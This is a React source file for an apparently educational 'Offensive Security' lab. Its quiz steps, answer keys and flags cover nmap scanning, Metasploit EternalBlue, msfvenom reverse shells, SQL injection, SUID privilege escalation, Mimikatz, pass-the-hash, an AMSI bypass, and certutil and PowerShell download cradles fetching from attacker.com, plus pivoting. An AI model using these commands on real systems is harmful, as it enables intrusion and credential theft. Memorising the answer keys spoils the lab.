'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#bf5fff'
const moduleId = 'offensive'
const moduleName = 'Offensive Security'
const moduleNum = '04'

const steps: LabStep[] = [

  // ── SECTION 1: Reconnaissance ────────────────────────────────────────────────
  {
    id: 'offensive-01',
    title: 'Nmap SYN Scan — The Stealth Scan Explained',
    objective: `You are beginning an authorised penetration test. The rules of engagement allow network scanning of the 192.168.1.0/24 subnet.

Your first task is port discovery. You want to scan all 65535 TCP ports on the target host using a SYN (half-open) scan, which is less likely to appear in application logs than a full connect scan.

What nmap flag specifies a SYN scan? (Combined with -p- to scan all ports and -T4 for timing, the full command would be: nmap -sS -p- -T4 192.168.1.10)`,
    hint: 'SYN scan is sometimes called a "stealth scan" or "half-open scan". The flag is -sS.',
    answers: ['-sS', 'nmap -sS', '-sS -p-', 'syn scan'],
    xp: 15,
    explanation: `nmap -sS is the default scan type when running as root. How it works:

  SYN → (wait) → SYN-ACK = port OPEN (nmap sends RST, never completes handshake)
  SYN → (wait) → RST      = port CLOSED
  SYN → (wait) → nothing  = port FILTERED (firewall dropping packets)

Why "stealth"? Most application-level logs only record fully-established TCP connections. Since the 3-way handshake is never completed, web server access logs, database logs, and application logs don't record the connection. However, network-level IDS (Snort, Suricata) and firewalls still see SYN packets.

Nmap scan types:
  -sS  SYN scan       — requires root, fast, less-logged
  -sT  Connect scan   — full 3-way handshake, logged by most apps, works without root
  -sU  UDP scan       — much slower (no handshake), catches DNS/SNMP/NTP
  -sA  ACK scan       — maps firewall rules, not for service discovery
  -sN  NULL scan      — no flags set, may bypass some simple firewalls

Critical timing flags:
  -T1  Sneaky         — very slow, evades rate-based IDS
  -T3  Normal         — default
  -T4  Aggressive     — fast, for CTFs and lab networks
  -T5  Insane         — may miss ports, not recommended

Always scan with -p- (all 65535 ports) in engagements — services are often running on non-standard ports intentionally.`
  },

  {
    id: 'offensive-02',
    title: 'Service Version Detection and NSE Scripts',
    objective: `After identifying open ports, you need to identify the exact software versions running on them. This is critical for CVE matching.

The target has ports 22 and 80 open. You want to run version detection AND the default NSE script set in a single nmap command. What two flags do you combine for version detection (-sV) plus default scripts?`,
    hint: 'The flag for default scripts is -sC. Both flags are commonly combined as -sC -sV.',
    answers: ['-sC -sV', '-sV -sC', 'sV sC', '-sC -sV -oA', 'nmap -sC -sV'],
    xp: 15,
    explanation: `nmap -sC -sV -oA scan_results target_ip

What each flag does:
  -sV   Probes open ports and identifies the service/version (e.g., "OpenSSH 8.2p1 Ubuntu")
  -sC   Runs the default NSE (Nmap Scripting Engine) script set — safe, informative scripts
  -oA   Output in all formats simultaneously: .nmap (text), .xml (parseable), .gnmap (grep-friendly)

Why version detection matters: "Port 80 open" tells you very little. "Apache httpd 2.4.49" tells you this host is vulnerable to CVE-2021-41773 (path traversal / RCE).

Useful NSE script categories:
  --script=vuln              — scan for known vulnerabilities
  --script=auth              — test for default/empty credentials
  --script=http-enum         — enumerate web server directories
  --script=smb-vuln-ms17-010 — specifically test for EternalBlue
  --script=ssh-hostkey       — get SSH host key fingerprint

NSE script examples:
  nmap --script=http-title -p 80,443,8080,8443 192.168.1.0/24   — grab web titles
  nmap --script=smb-vuln-* -p 445 192.168.1.0/24                — all SMB vulnerability scripts

Service version output to memorise:
  OpenSSH versions → compare against CVE database for outdated versions
  Apache/Nginx     → check against published RCE, LFI, path traversal CVEs
  vsftpd 2.3.4     → infamous backdoor (CVE-2011-2523) — still seen on old machines`
  },

  {
    id: 'offensive-03',
    title: 'Web Application Recon — Directory Enumeration',
    objective: `The target is running a web server on port 80. Before looking for specific vulnerabilities, you enumerate the web root for hidden directories and files.

What tool would you use to brute-force hidden directories on a web server using a wordlist, and what is the basic command structure?`,
    hint: 'gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt is the standard form.',
    answers: ['gobuster', 'gobuster dir', 'ffuf', 'dirbuster', 'feroxbuster', 'dirb'],
    xp: 15,
    explanation: `gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

Flag breakdown:
  dir          — directory/file bruteforce mode (vs dns mode for subdomain enum)
  -u           — target URL
  -w           — wordlist path
  -x           — file extensions to append to each word (critical for finding .php, .bak files)
  -t 50        — threads (default 10, increase for speed)
  --no-error   — suppress errors (noisy networks)
  -o results.txt — save output

Wordlists ranked by use case:
  /usr/share/wordlists/dirb/common.txt         — 4,600 words, fast, basic
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt — 220,000 words, thorough
  SecLists/Discovery/Web-Content/raft-large-*.txt — community-curated, excellent

Alternative tools:
  ffuf         — extremely fast, supports header fuzzing, POST body fuzzing, not just paths
  feroxbuster  — recursive by default (follows found directories), Rust-based speed
  dirsearch    — Python, good defaults, colour output

What to look for in results:
  /admin        — administrative panels
  /.git         — exposed git repository (source code leakage)
  /backup       — backup files (.zip, .tar, .sql)
  /config.php   — configuration files with credentials
  /.env         — Laravel/Node.js environment files with API keys
  /phpinfo.php  — PHP info disclosure

File extension strategy: always try .php, .txt, .html, .bak, .old, .zip for every engagement.`
  },

  // ── SECTION 2: Exploitation ──────────────────────────────────────────────────
  {
    id: 'offensive-04',
    title: 'Metasploit Framework — From Search to Shell',
    objective: `The target is running Windows 7 and has SMB port 445 open. Your scan confirms it is vulnerable to MS17-010 (EternalBlue). You open msfconsole to exploit it.

In Metasploit, after searching for the module and selecting it with "use", what command shows all required and optional parameters before you configure the exploit?`,
    hint: 'The command is simply: options (or show options — both work).',
    answers: ['options', 'show options', 'info', 'show info'],
    xp: 20,
    explanation: `Full EternalBlue exploitation workflow in msfconsole:

  msf6> search ms17-010
  msf6> use exploit/windows/smb/ms17_010_eternalblue
  msf6> options                    ← shows all parameters
  msf6> set RHOSTS 192.168.1.10    ← target IP
  msf6> set LHOST 192.168.1.5      ← your IP (for reverse shell callback)
  msf6> set LPORT 4444             ← your listening port
  msf6> run                        ← fire the exploit

If successful, you get a Meterpreter session:
  meterpreter> getuid              ← verify you are SYSTEM
  meterpreter> getsystem           ← attempt privilege escalation if not already SYSTEM
  meterpreter> hashdump            ← dump NTLM hashes from SAM database
  meterpreter> shell               ← drop to cmd.exe

MS17-010 context: EternalBlue was developed by the NSA, leaked by Shadow Brokers in April 2017. It exploits a buffer overflow in Windows SMBv1's transaction handling. It was used by WannaCry (May 2017) and NotPetya (June 2017) to cause billions in damages. Unpatched Windows 7 and Server 2008 machines are still common in enterprise networks.

Metasploit payload types:
  /reverse_tcp     — staged: downloads stage 2 payload after initial connection
  /reverse_tcp_allports — tries all ports if firewall blocks specific ones
  _inline          — stageless (larger, but self-contained, better for AV evasion)
  /bind_tcp        — target opens listening port, useful when outbound is filtered`
  },

  {
    id: 'offensive-05',
    title: 'msfvenom — Custom Payload Generation',
    objective: `The target environment has AV software that detects standard Metasploit EXEs. You need to generate a custom payload that connects back to your machine.

Using msfvenom, generate a Windows x64 stageless reverse TCP Meterpreter payload as an EXE. The key difference from a staged payload is the underscore: reverse_tcp vs reverse_tcp. The stageless format suffix is _inline or you can use the full stageless name.

What is the full msfvenom payload string for a Windows x64 stageless reverse TCP Meterpreter shell?`,
    hint: 'Stageless uses "inline" in the path. Format: windows/x64/meterpreter_reverse_tcp (note the underscore not slash between meterpreter and reverse).',
    answers: [
      'windows/x64/meterpreter_reverse_tcp',
      'msfvenom -p windows/x64/meterpreter_reverse_tcp',
      'windows/x64/shell_reverse_tcp',
      'windows/x64/meterpreter/reverse_tcp'
    ],
    flag: 'FLAG{payload_crafted}',
    xp: 20,
    explanation: `Full command:
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe

Key msfvenom flags:
  -p        payload module path
  LHOST     your IP or domain (the target calls back to you)
  LPORT     port your handler will listen on
  -f        output format (exe, elf, raw, ps1, vba, hta-psh, dll, jar...)
  -e        encoder (x86/shikata_ga_nai — reduces AV detection slightly)
  -i        encoder iterations
  -o        output file
  --list payloads  — view all available payloads

Staged (windows/x64/meterpreter/reverse_tcp):
  + Smaller initial payload
  + Second stage downloaded after first callback
  - Requires internet/network access for stage download
  - Second-stage download may be flagged

Stageless (windows/x64/meterpreter_reverse_tcp):
  + Self-contained — no second-stage download needed
  - Larger file size (~200KB vs ~5KB)
  + Works in air-gapped networks
  + Can be embedded in documents/scripts

Format selection for delivery:
  -f exe        — Windows executable (obvious, triggers most AV)
  -f ps1        — PowerShell script (less common AV coverage)
  -f vba        — Microsoft Office macro
  -f hta-psh    — HTML Application (runs via mshta.exe — trusted binary)
  -f dll        — DLL for DLL hijacking

Catch the callback with multi/handler:
  msf6> use exploit/multi/handler
  msf6> set payload windows/x64/meterpreter_reverse_tcp
  msf6> set LHOST 0.0.0.0
  msf6> set LPORT 4444
  msf6> run -j   (run as background job)`
  },

  {
    id: 'offensive-06',
    title: 'Web Exploitation — SQL Injection Primer',
    objective: `The web application has a login form. You test it for SQL injection by entering:
  Username: admin'--
  Password: anything

The login succeeds without the correct password. This is a classic authentication bypass. What character terminates the SQL string and begins the injection, and what do the two dashes do?`,
    hint: "The single quote ' closes the string literal in the SQL query. -- comments out everything after it.",
    answers: ["'", "single quote", "' --", "apostrophe comment", "' comment"],
    xp: 20,
    explanation: `The login form likely generates this SQL:
  SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

With your injection (admin'--):
  SELECT * FROM users WHERE username='admin'--' AND password='anything'
  → The -- comments out the password check entirely → authenticated as admin

Core SQL injection concepts:
  '           — closes the string, begins raw SQL
  --          — SQL comment (everything after is ignored)
  ;           — statement terminator (stack queries if driver allows)
  OR 1=1      — always-true condition (bypasses WHERE clauses)

Common injection payloads:
  ' OR '1'='1     — authentication bypass
  ' OR 1=1--      — authentication bypass variant
  ' UNION SELECT null,null,null-- — UNION-based data extraction (column count must match)
  ' AND SLEEP(5)-- — time-based blind SQLi (no output, but delay confirms injection)

SQLMap automation:
  sqlmap -u "http://target/login" --data="user=admin&pass=test" --dbs
  → Enumerates databases automatically

  sqlmap -u "http://target/page?id=1" -D database_name -T users --dump
  → Dumps the users table

Why SQLi is still common (OWASP #3):
  - Legacy codebases using string concatenation instead of parameterised queries
  - Developers testing/debugging without proper sanitisation
  - Stored procedures with dynamic SQL
  - ORM misuse (raw() methods, string formatting in queries)

Defence: parameterised queries / prepared statements (never concatenate user input into SQL), input validation, WAF rules, least-privilege database accounts.`
  },

  // ── SECTION 3: Post-Exploitation ─────────────────────────────────────────────
  {
    id: 'offensive-07',
    title: 'Windows Post-Exploitation — Meterpreter Fundamentals',
    objective: `You have a Meterpreter session on a Windows machine. You need to quickly gather information about the system: hostname, current user, OS version, and any running AV software.

What single Meterpreter command gathers a comprehensive system overview including hostname, OS, architecture, and logged-in users?`,
    hint: 'The command is: sysinfo',
    answers: ['sysinfo', 'meterpreter> sysinfo', 'sysinfo -h'],
    xp: 20,
    explanation: `Essential Meterpreter post-exploitation commands:

  sysinfo           — hostname, OS, architecture, language
  getuid            — current user context (NT AUTHORITY\\SYSTEM is best)
  getpid            — current process ID
  ps                — list all running processes (look for AV: MsMpEng, avgnt, etc.)
  migrate PID       — migrate to another process (stability, AV evasion, different user context)
  getsystem         — attempt privilege escalation to SYSTEM via 4 techniques
  hashdump          — dump SAM hashes (requires SYSTEM)
  run post/windows/gather/smart_hashdump — better hashdump, gets domain hashes too

File system:
  pwd, ls, cd       — navigate
  upload file.exe   — upload to target
  download file.txt — download from target
  search -f *.pdf -d C:\\  — search for files

Networking:
  ipconfig          — network interfaces
  arp               — ARP cache (discover adjacent hosts)
  portfwd add -l 8080 -p 3389 -r 192.168.2.10 — port forward through the session

Pivoting:
  route add 192.168.2.0/24 SESSION_ID  — route traffic to internal network through session
  background                            — background the session (Ctrl+Z)
  sessions -l                           — list all sessions
  sessions -i 1                         — interact with session 1

Persistence (leave listener for reconnection):
  run post/windows/manage/persistence_exe STARTUP=SCHEDULER  — scheduled task persistence
  Important: always remove persistence artifacts at end of engagement`
  },

  {
    id: 'offensive-08',
    title: 'Linux Privilege Escalation — SUID Binaries',
    objective: `You have a low-privileged shell on a Linux machine. You're looking for SUID binaries — files owned by root with the setuid bit set, which execute with root's privileges regardless of who runs them.

What find command locates all SUID binaries on the filesystem?`,
    hint: 'Use find with -perm /4000 (or -perm -u=s) to match the setuid bit, and -type f for files only.',
    answers: [
      'find / -perm /4000 -type f 2>/dev/null',
      'find / -perm -u=s -type f 2>/dev/null',
      'find / -perm -4000 -type f 2>/dev/null',
      'find / -perm /4000',
      'find -perm /4000'
    ],
    xp: 20,
    explanation: `find / -perm /4000 -type f 2>/dev/null

Flag meaning:
  /  — search from root (entire filesystem)
  -perm /4000   — matches files with SUID bit set (octal 4000)
  -type f       — files only (not directories)
  2>/dev/null   — suppress "permission denied" errors

How SUID exploitation works:
  A binary with SUID (chmod u+s binary) executes as the file owner, not the caller.
  If root owns a binary with SUID, any user can run it with root's effective UID.
  If that binary can be made to execute arbitrary commands (e.g., via a shell escape), you get root.

GTFOBins (gtfobins.github.io) — massive reference for binary exploits:
  SUID /usr/bin/find:
    find . -exec /bin/bash -p \; -quit   → bash with root EUID

  SUID /usr/bin/vim:
    vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-p")'

  SUID /usr/bin/python3:
    python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash")'

  SUID /usr/bin/cp:
    echo "attacker ALL=(ALL) NOPASSWD:ALL" | cp /dev/stdin /etc/sudoers.d/attacker

Other privesc vectors to check (LinPEAS automates all of these):
  sudo -l           — commands you can run as root without password
  /etc/crontab      — scheduled tasks running as root
  writable /etc/passwd  — you can add a new root user
  PATH manipulation — scripts calling binaries without full path
  Kernel exploits   — dirty cow, dirty pipe, polkit (check with uname -r and searchsploit)`
  },

  // ── SECTION 4: Persistence & Lateral Movement ────────────────────────────────
  {
    id: 'offensive-09',
    title: 'Credential Harvesting — Mimikatz and LSASS',
    objective: `You have SYSTEM privileges on a Windows box. You want to extract plaintext credentials and NTLM hashes from LSASS memory — the process responsible for Windows authentication.

Mimikatz is the go-to tool for this. What is the Mimikatz command sequence that dumps plaintext credentials from LSASS?`,
    hint: 'The privilege elevation command is "privilege::debug" and the credential dump is "sekurlsa::logonpasswords".',
    answers: [
      'sekurlsa::logonpasswords',
      'privilege::debug sekurlsa::logonpasswords',
      'mimikatz sekurlsa::logonpasswords',
      'lsadump::sam',
      'sekurlsa'
    ],
    flag: 'FLAG{creds_harvested}',
    xp: 20,
    explanation: `Mimikatz command sequence (run in a cmd/PowerShell with SYSTEM or admin privileges):

  mimikatz# privilege::debug           ← enables SeDebugPrivilege (needed to read LSASS)
  mimikatz# sekurlsa::logonpasswords   ← dumps credentials from LSASS memory

Output includes:
  Username, domain, NTLM hash, and sometimes plaintext passwords (WDigest)
  Kerberos tickets (can be used for Pass-the-Ticket attacks)

From a Meterpreter session:
  meterpreter> load kiwi              ← loads Mimikatz as a Meterpreter extension
  meterpreter> creds_all              ← equivalent to sekurlsa::logonpasswords

Other useful Mimikatz modules:
  lsadump::sam          — dumps SAM database (local accounts + hashes)
  lsadump::dcsync       — pretend to be a domain controller, pull all AD hashes
  kerberos::list        — list Kerberos tickets in memory
  sekurlsa::pth         — pass-the-hash: spawn process authenticating as harvested hash

Defences against Mimikatz:
  Windows Credential Guard    — isolates LSASS in a hypervisor-protected container
  Protected Users group       — disables WDigest, limits Kerberos caching
  Disable WDigest manually    — reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0
  EDR with memory protection  — most modern EDRs (CrowdStrike, Defender for Endpoint) detect sekurlsa

Pass-the-Hash workflow:
  Capture hash with Mimikatz → use in psexec, wmiexec, Evil-WinRM without knowing plaintext password
  impacket-psexec administrator@192.168.1.10 -hashes :8846f7eaee8fb117ad06bdd830b7586c`
  },

  {
    id: 'offensive-10',
    title: 'Lateral Movement — PsExec and Pass-the-Hash',
    objective: `You have an NTLM hash for the local Administrator account and you know this hash is reused across multiple machines in the network (common misconfiguration). You want to use Impacket's psexec.py to authenticate to another machine using only the hash.

What Impacket tool and syntax would you use to get a SYSTEM shell on 192.168.1.20 using the hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c?`,
    hint: 'The tool is impacket-psexec or psexec.py. The hash syntax uses the format LM:NT after the -hashes flag.',
    answers: [
      'impacket-psexec',
      'psexec.py',
      'impacket-psexec administrator@192.168.1.20 -hashes :8846f7eaee8fb117ad06bdd830b7586c',
      'impacket-wmiexec',
      'evil-winrm'
    ],
    xp: 20,
    explanation: `Pass-the-Hash with Impacket:

  impacket-psexec administrator@192.168.1.20 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

How it works: Windows NTLM authentication doesn't actually require the plaintext password — only the hash. PsExec uploads a service binary to the target via SMB (ADMIN$), starts it as a service, then provides a shell.

Impacket lateral movement toolkit (python-based, Linux-friendly):
  impacket-psexec      — uploads service binary, returns SYSTEM shell, noisy, leaves artifacts
  impacket-wmiexec     — WMI-based execution, semi-interactive, quieter than psexec
  impacket-smbexec     — SMB-based, slightly more stealthy
  impacket-atexec      — uses Task Scheduler via SMB, async execution
  impacket-dcomexec    — DCOM-based lateral movement

Evil-WinRM (if WinRM/port 5985 is open):
  evil-winrm -i 192.168.1.20 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c

Hash reuse in enterprises:
  Many organisations image workstations with the same local Administrator password.
  One compromise → Mimikatz → hash → lateral movement to every workstation in the domain.
  This is why Microsoft's LAPS (Local Administrator Password Solution) exists — it randomises and rotates local admin passwords per machine.

Detection:
  4624 event with LogonType 3 (network logon) from unexpected sources
  Services being installed on remote hosts (7045 event)
  ADMIN$ share access from workstations`
  },

  // ── SECTION 5: Evasion and OPSEC ─────────────────────────────────────────────
  {
    id: 'offensive-11',
    title: 'AV Evasion — Living Off the Land',
    objective: `Your payload keeps getting flagged by Windows Defender. Rather than modify the payload, you decide to use a trusted Windows binary to execute code — a technique called "Living off the Land" (LotL).

One of the most powerful LotL techniques uses certutil.exe (a legitimate Windows certificate utility) to download a file from the internet. What certutil command would download a file from http://attacker.com/shell.exe to C:\\Windows\\Temp\\a.exe?`,
    hint: 'certutil has a -urlcache option. The -split -f flags force download and split output.',
    answers: [
      'certutil -urlcache -split -f http://attacker.com/shell.exe C:\\Windows\\Temp\\a.exe',
      'certutil -urlcache -f http://attacker.com/shell.exe',
      'certutil -split -f -urlcache',
      'certutil -urlcache'
    ],
    xp: 20,
    explanation: `certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\\Windows\\Temp\\a.exe

Why this works: certutil.exe is signed by Microsoft, trusted by the OS, whitelisted by most AV products, and commonly used by IT admins. Downloading files is a legitimate use case for it (downloading CRL files, certificates). Many older AV products won't inspect what a trusted binary downloads.

Top Living off the Land Binaries (LOLBins):
  certutil.exe      — download files, encode/decode base64
  mshta.exe         — execute HTA (HTML Application) files, often used for payload staging
  regsvr32.exe      — register DLLs, can load remote SCT files (Squiblydoo technique)
  wmic.exe          — WMI, remote execution, process creation
  cscript/wscript   — execute VBScript/JavaScript
  rundll32.exe      — load and execute DLL exports
  msbuild.exe       — build C# projects inline, execute arbitrary code
  powershell.exe    — endless options (encoded commands, AMSI bypass, reflective loading)

Microsoft's LOLBAS project (lolbas-project.github.io) catalogs all known LOLBins with examples.

PowerShell download cradle (another common technique):
  IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

AMSI bypass (needed for PowerShell-based attacks):
  AMSI (Antimalware Scan Interface) allows AV to inspect PowerShell commands at runtime.
  Basic bypass: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  (This is publicly known — EDRs patch it, but many variations exist)

Detection: Windows Defender for Endpoint flags LOLBin abuse by correlating command-line arguments with process lineage. Hunting query: parent process = Office + child = certutil/mshta/wmic.`
  },

  // ── SECTION 6: Pivoting & Reporting ──────────────────────────────────────────
  {
    id: 'offensive-12',
    title: 'Network Pivoting — Reaching Internal Segments',
    objective: `You have compromised a DMZ server (192.168.1.10) and discovered an internal network: 10.10.10.0/24. Your Kali machine cannot directly reach 10.10.10.0/24, but the compromised server can.

In Metasploit, what command adds a route through your existing session (session 1) so that Metasploit can reach the internal 10.10.10.0/24 network?`,
    hint: 'The command is: route add followed by the network, subnet mask (or CIDR), and session ID.',
    answers: [
      'route add 10.10.10.0/24 1',
      'route add 10.10.10.0 255.255.255.0 1',
      'route add 10.10.10.0 1',
      'msf6> route add 10.10.10.0/24 1'
    ],
    xp: 20,
    explanation: `Metasploit pivoting:

  msf6> route add 10.10.10.0/24 1   (session ID = 1)
  msf6> route print                  — verify routes
  → All Metasploit modules targeting 10.10.10.x now route through session 1

  # Scan the internal network through the pivot
  msf6> use auxiliary/scanner/portscan/tcp
  msf6> set RHOSTS 10.10.10.0/24
  msf6> set PORTS 22,80,443,445,3389
  msf6> run

Socks proxy for non-Metasploit tools:
  msf6> use auxiliary/server/socks_proxy
  msf6> set SRVPORT 1080
  msf6> run -j

  Edit /etc/proxychains4.conf → add: socks5 127.0.0.1 1080
  Then prefix any command: proxychains nmap -sT -p 80 10.10.10.5
  (Note: proxychains requires TCP connect scan -sT, not SYN scan)

SSH tunnelling (alternative when Metasploit isn't available):
  # Dynamic SOCKS proxy via SSH on the pivot host
  ssh -D 1080 -f -N user@192.168.1.10
  → All tools using proxychains now route through the SSH tunnel

  # Local port forward (specific service)
  ssh -L 3389:10.10.10.5:3389 user@192.168.1.10
  → Connect to localhost:3389 to reach internal RDP server

Chisel (lightweight tunnelling tool, great for restricted environments):
  On pivot: chisel server -p 8080 --reverse
  On Kali: chisel client PIVOT_IP:8080 R:socks`
  },

  {
    id: 'offensive-13',
    title: 'Pentest Reporting — CVSS Scoring',
    objective: `Every vulnerability you find must be documented with a severity rating so the client can prioritise remediation. CVSS (Common Vulnerability Scoring System) v3.1 produces scores from 0.0 to 10.0.

You found an unauthenticated Remote Code Execution vulnerability on an internet-facing server. This would score Critical (9.0-10.0 CVSS). What CVSS score range maps to CRITICAL severity?`,
    hint: 'CVSS severity bands: Critical = 9.0-10.0, High = 7.0-8.9, Medium = 4.0-6.9, Low = 0.1-3.9.',
    answers: ['9.0-10.0', '9 to 10', 'critical 9.0', '9.0 to 10.0', '9.0'],
    flag: 'FLAG{pentest_report_filed}',
    xp: 20,
    explanation: `CVSS v3.1 severity bands:
  Critical  9.0 – 10.0   — Immediate action, likely weaponised already
  High      7.0 – 8.9    — Patch within 30 days
  Medium    4.0 – 6.9    — Patch within 90 days
  Low       0.1 – 3.9    — Document, fix in next maintenance cycle
  None      0.0          — Informational

CVSS base metrics:
  Attack Vector (AV):       N=Network, A=Adjacent, L=Local, P=Physical
  Attack Complexity (AC):   L=Low, H=High
  Privileges Required (PR): N=None, L=Low, H=High
  User Interaction (UI):    N=None, R=Required
  Scope (S):                U=Unchanged, C=Changed
  Confidentiality (C):      N=None, L=Low, H=High
  Integrity (I):            N=None, L=Low, H=High
  Availability (A):         N=None, L=Low, H=High

Unauthenticated RCE on internet-facing server:
  AV:N / AC:L / PR:N / UI:N / S:C / C:H / I:H / A:H → CVSS 10.0

Pentest report structure (industry standard):
  1. Executive Summary     — business risk, key findings, ROI of fixes
  2. Scope & Methodology   — what was tested, what tools/techniques were used
  3. Findings              — sorted by CVSS, each with: description, evidence, CVSS vector, remediation
  4. Remediation Roadmap   — prioritised fix list with effort/impact estimates
  5. Appendices            — raw scan data, tool outputs, screenshots

Evidence requirements per finding:
  - Screenshot of the vulnerability being exploited
  - Reproduction steps (precise, numbered)
  - CVSS vector string and calculated score
  - CVE references if applicable
  - Specific remediation advice (not just "fix the vulnerability")`
  },

  {
    id: 'offensive-14',
    title: 'Vulnerability Scanning with OpenVAS/Nessus',
    objective: `Before manual exploitation, a professional pentest always includes an automated vulnerability scan to create a baseline and catch obvious issues.

Nessus and OpenVAS are the two most common enterprise vulnerability scanners. What is the open-source alternative to Nessus that is maintained by Greenbone Networks and available free?`,
    hint: 'Greenbone Vulnerability Manager is the community version. Abbreviated GVM, it was previously called OpenVAS.',
    answers: ['openvas', 'gvm', 'greenbone', 'OpenVAS', 'GVM', 'Greenbone Vulnerability Manager'],
    xp: 15,
    explanation: `OpenVAS/GVM (Greenbone Vulnerability Manager):
  - Free, open-source
  - Web interface at https://localhost:9392 after setup
  - Feed of 80,000+ Network Vulnerability Tests (NVTs)
  - Install on Kali: sudo apt install gvm && sudo gvm-setup

Nessus Essentials (formerly Nessus Home):
  - Free for home/student use (16 IP limit)
  - 180,000+ plugins, best in class
  - Download from tenable.com/products/nessus/nessus-essentials

Scanner workflow:
  1. Discovery scan — find live hosts (ping sweep)
  2. Port scan — which ports are open on each host
  3. Vulnerability scan — probe each service for known vulnerabilities
  4. Credentials scan — provide valid credentials for deeper authenticated scanning

Authenticated vs unauthenticated scans:
  Unauthenticated: simulates external attacker, finds externally-visible issues
  Authenticated: scanner logs in with provided credentials, finds patch-level issues, misconfigured services, password policies, local vulnerabilities

False positive management:
  Always verify findings manually — scanners report theoretical vulnerabilities based on version strings, which may not be exploitable if the vulnerable code path is not reachable.

Scan output formats:
  Nessus: .nessus (XML), CSV, PDF
  OpenVAS: XML, CSV, PDF, HTML
  Parse with tools like DefectDojo or Dradis for report generation`
  },

  {
    id: 'offensive-15',
    title: 'Covering Tracks — Log Clearing and Anti-Forensics',
    objective: `At the end of a penetration test, the rules of engagement require you to clean up your artifacts (dropped files, persistence, temporary tools) to leave the system in its original state.

On a Linux target, what file contains authentication logs (failed SSH logins, sudo usage, PAM events) that you would need to consider during cleanup documentation?`,
    hint: 'On Debian/Ubuntu systems this is /var/log/auth.log. On RHEL/CentOS it is /var/log/secure.',
    answers: ['/var/log/auth.log', 'auth.log', '/var/log/secure', 'var/log/auth.log'],
    flag: 'FLAG{tracks_documented}',
    xp: 20,
    explanation: `Linux log locations relevant to pentest cleanup documentation:

  /var/log/auth.log     — SSH logins, sudo, su, PAM events (Debian/Ubuntu)
  /var/log/secure       — same, RHEL/CentOS/Fedora
  /var/log/syslog       — general system events
  /var/log/messages     — same, RHEL-based
  /var/log/apache2/     — web server access and error logs
  /var/log/nginx/       — nginx access and error logs
  /var/log/cron         — cron job execution logs
  ~/.bash_history       — command history per user
  /var/log/wtmp         — login/logout history (read with: last)
  /var/log/btmp         — failed login attempts (read with: lastb)
  /var/log/lastlog      — last login per user (read with: lastlog)

Pentest cleanup checklist (authorised engagements):
  - Remove uploaded tools (nc, linpeas, chisel, payload.exe from temp directories)
  - Remove created users or SSH keys
  - Restore any modified system files (crontabs, /etc/sudoers, /etc/passwd)
  - Remove persistence mechanisms (scheduled tasks, registry run keys, startup entries)
  - Document what you accessed — the report must disclose all sensitive data touched

Important ethical note: clearing logs is illegal without authorisation and crosses the line from penetration testing to criminal damage. Professional engagements explicitly define cleanup procedures in the rules of engagement document. Never delete evidence on a live incident — that is obstruction of justice.

Anti-forensics techniques (for understanding defender perspective):
  Timestomping    — modifying file MAC times to disguise when files were created/modified
  Log tampering   — selectively removing specific entries from logs
  Encrypted comms — using TLS/HTTPS for C2 to hide payload content from network monitoring
  Process hollowing — running malicious code inside the memory space of a legitimate process`
  },

]

export default function OffensiveLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  const sections = [
    { num: '01-03', title: 'Reconnaissance — Nmap, Web Enum', color: accent },
    { num: '04-06', title: 'Exploitation — Metasploit, SQLi, Payloads', color: accent },
    { num: '07-08', title: 'Post-Exploitation — Windows & Linux', color: accent },
    { num: '09-10', title: 'Credential Harvesting & Lateral Movement', color: accent },
    { num: '11-12', title: 'Evasion, LotL & Pivoting', color: accent },
    { num: '13-15', title: 'Reporting, Scanning & Anti-Forensics', color: accent },
  ]

  useEffect(() => {
    const saved = localStorage.getItem('lab_offensive-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a3a7a' }}>
        <Link href="/" style={{ color: '#5a3a7a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/offensive" style={{ color: '#5a3a7a', textDecoration: 'none' }}>OFFENSIVE SECURITY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/offensive" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a1a5a', borderRadius: '3px', color: '#5a3a7a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
